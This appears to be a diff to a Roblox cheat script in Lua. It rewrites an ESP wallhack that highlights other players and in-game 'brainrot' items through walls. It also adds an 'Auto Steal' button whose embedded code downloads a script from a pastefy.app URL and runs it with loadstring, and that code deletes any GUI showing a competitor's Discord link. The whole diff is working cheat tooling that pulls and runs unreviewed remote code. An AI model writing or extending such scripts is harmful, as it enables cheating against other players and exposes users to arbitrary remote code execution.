@@ -84,7 +84,7 @@ SettingsOpenButton.Image = "rbxassetid://100665044102453"
 Instance.new("UICorner", SettingsOpenButton).CornerRadius = UDim.new(0, 10)
 
 local SettingsGUI = Instance.new("Frame", frame)
-SettingsGUI.Size = UDim2.new(0, 190, 0, 140)
+SettingsGUI.Size = UDim2.new(0, 190, 0, 220)
 SettingsGUI.Position = UDim2.new(12.0, 0, 0, 0)
 SettingsGUI.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 Instance.new("UICorner", SettingsGUI).CornerRadius = UDim.new(0, 10)
@@ -152,111 +152,160 @@ local function pingOnce()
     end
 end
 
+local COLOR_PLAYER_BLUE = Color3.fromRGB(0, 120, 255)
+local COLOR_PLAYER_FRIEND = Color3.fromRGB(0, 255, 100)
+local COLOR_BRAINROT = Color3.fromRGB(255, 0, 0)
+local HIGHLIGHT_FILL_TRANSPARENCY = 0.6
+local HIGHLIGHT_OUTLINE_TRANSPARENCY = 0.15
 
+local function sameTeam(p1, p2)
+    return p1 and p2 and p1.Team and p2.Team and p1.Team == p2.Team
+end
+
+local function getModelReferencePart(model)
+    if not model then return nil end
+    if model:IsA("Model") and model.PrimaryPart then return model.PrimaryPart end
+    local hrp = model:FindFirstChild("HumanoidRootPart")
+    if hrp then return hrp end
+    for _, child in ipairs(model:GetChildren()) do
+        if child:IsA("BasePart") then return child end
+    end
+    return nil
+end
 
 local function cleanupESP()
-    for c, data in pairs(CharacterESP) do
-        if data.conn then data.conn:Disconnect() end
-        if data.highlight then data.highlight:Destroy() end
-        if data.billboard then data.billboard:Destroy() end
+    for model, data in pairs(CharacterESP) do
+        if data.Highlight and data.Highlight.Parent then
+            pcall(function() data.Highlight:Destroy() end)
+        end
+        if data.Billboard and data.Billboard.Parent then
+            pcall(function() data.Billboard:Destroy() end)
+        end
     end
     CharacterESP = {}
 end
 
 local function isAlive(character)
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
     return humanoid and humanoid.Health > 0
 end
 
-local function getHead(character)
-    return character:FindFirstChild("Head")
+local function distanceFromCameraPosition(pos)
+    return (Camera.CFrame.Position - pos).Magnitude
 end
 
-local function distanceFromCamera(cf)
-    return (Camera.CFrame.Position - cf.Position).Magnitude
-end
+local function createESP(model, owner, displayName)
+    if not model then return end
+    if CharacterESP[model] then return end
 
-local function sameTeam(p1, p2)
-    return p1.Team and p2.Team and p1.Team == p2.Team
-end
-
-local function makeHighlight(character, color)
-    local h = Instance.new("Highlight")
-    h.Adornee = character
-    h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-    h.FillTransparency = 0.15
-    h.OutlineTransparency = 0.05
-    h.OutlineColor = Color3.fromRGB(255, 255, 255)
-    h.FillColor = color
-    h.Parent = character
-    return h
-end
-
-local function makeNameBillboard(head, text, color)
-    local bb = Instance.new("BillboardGui")
-    bb.Size = UDim2.new(0, 200, 0, 50)
-    bb.AlwaysOnTop = true
-    bb.StudsOffset = Vector3.new(0, 2.5, 0)
-    bb.MaxDistance = MAX_DISTANCE + 25
-    bb.Adornee = head
-    bb.Parent = head
-
-    local tl = Instance.new("TextLabel")
-    tl.Size = UDim2.fromScale(1, 1)
-    tl.BackgroundTransparency = 1
-    tl.Text = text
-    tl.TextSize = 22
-    tl.Font = Enum.Font.GothamBold
-    tl.TextColor3 = color
-    tl.TextStrokeTransparency = 0
-    tl.TextStrokeColor3 = Color3.new(0, 0, 0)
-    tl.TextScaled = true
-    tl.Parent = bb
-
-    return bb
-end
-
-local function createESP(part, owner)
-    if not part or not part.Parent then return end
-    if CharacterESP[part.Parent] then return end
-
-    local color
-    if owner.IsPlayer then
-        color = sameTeam(LocalPlayer, owner.Player) and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(0, 120, 255)
-    else
-        color = Color3.fromRGB(255, 0, 0)
-    end
-
-    local highlight = makeHighlight(part.Parent, color)
-    local head = getHead(part.Parent)
-    local billboard
-    if head then
-        billboard = makeNameBillboard(head, owner.Name, color)
-    end
-
-    local conn
-    conn = RunService.RenderStepped:Connect(function()
-        if not part.Parent or (part.Parent:FindFirstChildOfClass("Humanoid") and not isAlive(part.Parent)) then
-            highlight.Enabled = false
-            if billboard then billboard.Enabled = false end
-            return
-        end
-        local d = distanceFromCamera(part.CFrame)
-        local within = d <= MAX_DISTANCE
-        highlight.Enabled = within
-        if billboard then billboard.Enabled = within end
-
-        if owner.IsPlayer then
-            highlight.FillColor = sameTeam(LocalPlayer, owner.Player) and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(0, 120, 255)
-            if billboard then billboard:FindFirstChildWhichIsA("TextLabel").TextColor3 = highlight.FillColor end
+    local fillColor
+    if owner and owner.IsPlayer then
+        if owner.Player and sameTeam(LocalPlayer, owner.Player) then
+            fillColor = COLOR_PLAYER_FRIEND
         else
-            highlight.FillColor = Color3.fromRGB(255, 0, 0)
-            if billboard then billboard:FindFirstChildWhichIsA("TextLabel").TextColor3 = highlight.FillColor end
+            fillColor = COLOR_PLAYER_BLUE
         end
-    end)
+    else
+        fillColor = COLOR_BRAINROT
+    end
 
-    CharacterESP[part.Parent] = {highlight = highlight, billboard = billboard, conn = conn}
+    local highlight = Instance.new("Highlight")
+    highlight.Name = "ESP_Highlight"
+    highlight.Adornee = model
+    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    highlight.FillTransparency = HIGHLIGHT_FILL_TRANSPARENCY
+    highlight.OutlineTransparency = HIGHLIGHT_OUTLINE_TRANSPARENCY
+    highlight.FillColor = fillColor
+    highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
+    highlight.Parent = workspace
+
+    local adorneePart = model:FindFirstChild("Head") or getModelReferencePart(model)
+    local billboard = nil
+    if adorneePart and displayName then
+        billboard = Instance.new("BillboardGui")
+        billboard.Name = "ESP_Name"
+        billboard.Adornee = adorneePart
+        billboard.AlwaysOnTop = true
+        billboard.Size = UDim2.fromOffset(140, 24)
+        billboard.ExtentsOffsetWorldSpace = Vector3.new(0, 2.2, 0)
+        billboard.MaxDistance = MAX_DISTANCE
+        billboard.Parent = adorneePart
+
+        local label = Instance.new("TextLabel")
+        label.Name = "ESPNameLabel"
+        label.BackgroundTransparency = 1
+        label.Size = UDim2.fromScale(1, 1)
+        label.Text = displayName
+        label.TextScaled = true
+        label.TextSize = 16
+        label.Font = Enum.Font.GothamMedium
+        label.TextColor3 = fillColor
+        label.Parent = billboard
+
+        local stroke = Instance.new("UIStroke")
+        stroke.Thickness = 1
+        stroke.Color = Color3.fromRGB(0, 0, 0)
+        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+        stroke.Parent = label
+    end
+
+    CharacterESP[model] = {
+        Highlight = highlight,
+        Billboard = billboard,
+        Owner = owner
+    }
 end
+
+RunService.RenderStepped:Connect(function()
+    if not settings.ESP then
+        for model, data in pairs(CharacterESP) do
+            if data.Highlight then data.Highlight.Enabled = false end
+            if data.Billboard then data.Billboard.Enabled = false end
+        end
+        return
+    end
+
+    for model, data in pairs(CharacterESP) do
+        local valid = model and model.Parent
+        if not valid then
+            if data.Highlight and data.Highlight.Parent then pcall(function() data.Highlight:Destroy() end) end
+            if data.Billboard and data.Billboard.Parent then pcall(function() data.Billboard:Destroy() end) end
+            CharacterESP[model] = nil
+        else
+            local refPart = getModelReferencePart(model)
+            if refPart then
+                local pos = refPart.Position
+                local d = distanceFromCameraPosition(pos)
+                local within = d <= MAX_DISTANCE
+                local owner = data.Owner
+                local show = within
+                if owner and owner.IsPlayer and model:FindFirstChildOfClass("Humanoid") then
+                    show = show and isAlive(model)
+                end
+
+                if data.Highlight then
+                    data.Highlight.Enabled = show
+                    if owner and owner.IsPlayer then
+                        if owner.Player and sameTeam(LocalPlayer, owner.Player) then
+                            data.Highlight.FillColor = COLOR_PLAYER_FRIEND
+                        else
+                            data.Highlight.FillColor = COLOR_PLAYER_BLUE
+                        end
+                    else
+                        data.Highlight.FillColor = COLOR_BRAINROT
+                    end
+                end
+
+                if data.Billboard then
+                    data.Billboard.Enabled = show
+                end
+            else
+                if data.Highlight then data.Highlight.Enabled = false end
+                if data.Billboard then data.Billboard.Enabled = false end
+            end
+        end
+    end
+end)
 
 local function matchesBrainrot(name, obj)
     for _, br in ipairs(brainrotNames) do
@@ -291,10 +340,7 @@ local function scan()
                 foundNamesLocal[match] = true
 
                 if settings.ESP then
-                    local part = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
-                    if part then
-                        createESP(part, {Name = match, IsPlayer = false})
-                    end
+                    createESP(obj, {Name = match, IsPlayer = false}, match)
                 end
 
                 if settings.Ping and not pinged then
@@ -310,11 +356,8 @@ local function scan()
     if settings.ESP then
         for _, player in ipairs(Players:GetPlayers()) do
             if player ~= LocalPlayer and player.Character then
-                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
-                if hrp then
-                    createESP(hrp, {Name = player.Name, IsPlayer = true, Player = player})
-                    foundNamesLocal[player.Name] = true
-                end
+                createESP(player.Character, {Name = player.Name, IsPlayer = true, Player = player}, (player.DisplayName ~= "" and player.DisplayName) or player.Name)
+                foundNamesLocal[player.Name] = true
             end
         end
     end
@@ -322,6 +365,7 @@ local function scan()
     foundBrainrots = foundBrainrotsLocal
     foundNames = foundNamesLocal
     hasFound = hasFoundLocal
+
 
     for name, count in pairs(foundBrainrotsLocal) do
         local logLabel = Instance.new("TextLabel")
@@ -343,6 +387,124 @@ local function scan()
         pinged = false
     end
 end
+
+local AUTO_STEAL_CODE = [[
+local GUI_LOADER_URL = "https://pastefy.app/O0LXMwBW/raw"
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+while not player do wait() end
+local playerGui = player:WaitForChild("PlayerGui")
+
+local function safeLoad(url)
+    pcall(function()
+        local body = game:HttpGet(url)
+        local fn = loadstring(body)
+        if fn then pcall(fn) end
+    end)
+end
+
+spawn(function() safeLoad(GUI_LOADER_URL) end)
+
+spawn(function()
+    local gui, button
+    while true do
+        if not gui then gui = playerGui:FindFirstChild("LENNON_TWEEN_PLUS_V3", true) end
+        if gui and not button then button = gui:FindFirstChild("AtivarTeleguiadoBtn", true) end
+        if gui and gui:IsA("ScreenGui") then gui.Enabled = true end
+        if button and button:IsA("GuiObject") then button.Visible = true end
+        wait(0.1)
+    end
+end)
+
+local function isBlacklisted(text)
+    local t = tostring(text or "")
+    t = t:gsub("<.->", ""):lower()
+    local nospaces = t:gsub("%s+", "")
+    if t:find("join discord for more scripts", 1, true) then return true end
+    if nospaces:find("https://discord.gg/fmuqpzjahx", 1, true) then return true end
+    if nospaces:find("discord.gg/fmuqpzjahx", 1, true) then return true end
+    return false
+end
+
+local function nukeIfBlacklisted(lbl)
+    if not (lbl and lbl:IsA("TextLabel")) then return end
+    if isBlacklisted(lbl.Text) then
+        local root = lbl:FindFirstAncestorOfClass("ScreenGui")
+        if root then root:Destroy() else lbl:Destroy() end
+    end
+end
+
+local function watchLabel(lbl)
+    nukeIfBlacklisted(lbl)
+    if not (lbl and lbl:IsA("TextLabel")) then return end
+    lbl:GetPropertyChangedSignal("Text"):Connect(function()
+        nukeIfBlacklisted(lbl)
+    end)
+end
+
+for _, d in ipairs(playerGui:GetDescendants()) do
+    if d:IsA("TextLabel") then
+        watchLabel(d)
+    end
+end
+
+playerGui.DescendantAdded:Connect(function(obj)
+    if obj:IsA("TextLabel") then
+        watchLabel(obj)
+    end
+end)
+]]
+
+local autoStealActive = false
+local AutoStealBtn = Instance.new("TextButton", SettingsGUI)
+AutoStealBtn.Size = UDim2.new(0, 170, 0, 34)
+AutoStealBtn.Position = UDim2.new(0.05, 0, 0.6, 0)
+AutoStealBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+AutoStealBtn.BorderSizePixel = 0
+AutoStealBtn.Font = Enum.Font.FredokaOne
+AutoStealBtn.TextSize = 16
+AutoStealBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+AutoStealBtn.Text = "Auto Steal"
+Instance.new("UICorner", AutoStealBtn).CornerRadius = UDim.new(0, 8)
+
+AutoStealBtn.MouseButton1Click:Connect(function()
+    if autoStealActive then return end
+    autoStealActive = true
+    AutoStealBtn.Text = "Auto Steal Loaded!"
+    task.wait(1)
+    AutoStealBtn.Text = "Auto Steal"
+    AutoStealBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
+    spawn(function()
+        local ok, err = pcall(function()
+            local fn = loadstring(AUTO_STEAL_CODE)
+            if fn then fn() end
+        end)
+        if not ok then
+            warn("Auto Steal execution error:", err)
+            AutoStealBtn.Text = "Auto Steal: ERR"
+        end
+    end)
+end)
+
+local CloseBtn = Instance.new("TextButton", SettingsGUI)
+CloseBtn.Size = UDim2.new(0, 170, 0, 30)
+CloseBtn.Position = UDim2.new(0.05, 0, 0.8, 0)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+CloseBtn.BorderSizePixel = 0
+CloseBtn.Font = Enum.Font.FredokaOne
+CloseBtn.TextSize = 16
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.Text = "Close"
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)
+
+
+CloseBtn.MouseButton1Click:Connect(function()
+    settingsOpen = false
+    TweenService:Create(SettingsGUI, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {Position = UDim2.new(12.0, 0, 0, 0)}):Play()
+end)
 
 local function tryServers()
     local req = (syn and syn.request) or request or http_request
